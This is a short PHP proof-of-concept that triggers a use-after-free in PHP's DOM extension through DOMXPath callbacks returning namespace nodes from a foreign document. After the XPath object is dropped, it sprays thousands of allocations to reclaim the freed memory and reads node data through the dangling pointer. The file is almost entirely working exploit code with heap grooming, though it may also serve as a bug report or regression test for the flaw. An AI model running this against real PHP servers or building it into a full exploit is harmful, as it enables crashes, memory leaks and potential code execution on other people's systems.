<?php
/**
 * DOMXPath callback nodeset argument: namespace-axis nodes from a document
 * created inside another callback. The parent wrapper is tied to the
 * DOMXPath document instead of the foreign document (xpath_callbacks.c).
 * Dropping the XPath frees the foreign document while the namespace node
 * still points at it.
 */
function say($s) {
    echo $s, "\n";
    fflush(STDOUT);
}

say("php=" . PHP_VERSION);
$doc = new DOMDocument();
$doc->loadXML('<root/>');

$xp = new DOMXPath($doc);
$xp->registerNamespace('my', 'my.ns');
$xp->registerPHPFunctionNS('my.ns', 'include', function () {
    $d = new DOMDocument();
    $d->loadXML('<r><uaf xmlns:a="urn:a">payload</uaf></r>');
    return $d->documentElement;
});

$held = null;
$xp->registerPHPFunctionNS('my.ns', 'take', function ($nodes) use (&$held) {
    $held = $nodes;
    return true;
});

$xp->query('my:take(my:include()/uaf/namespace::*)');
$n = is_array($held) ? count($held) : -1;
say("held=$n");
unset($xp);
say("xpath-dropped");

/* Reclaim libxml node memory so the dangling parent is not a stale-but-intact chunk. */
$spray = [];
for ($i = 0; $i < 4000; $i++) {
    $s = new DOMDocument();
    $s->loadXML('<n' . $i . '>' . str_repeat('Z', 48) . '</n' . $i . '>');
    $spray[] = $s->documentElement;
}

foreach ($held as $i => $ns) {
    say("i=$i nodeName=" . @$ns->nodeName);
    $p = @$ns->parentNode;
    if ($p === null) {
        say("i=$i parent=null");
        continue;
    }
    say("i=$i parentName=" . @$p->nodeName);
    say("i=$i parentText=" . @$p->textContent);
}
say("release-held");
unset($held);
unset($spray);
say("Done");
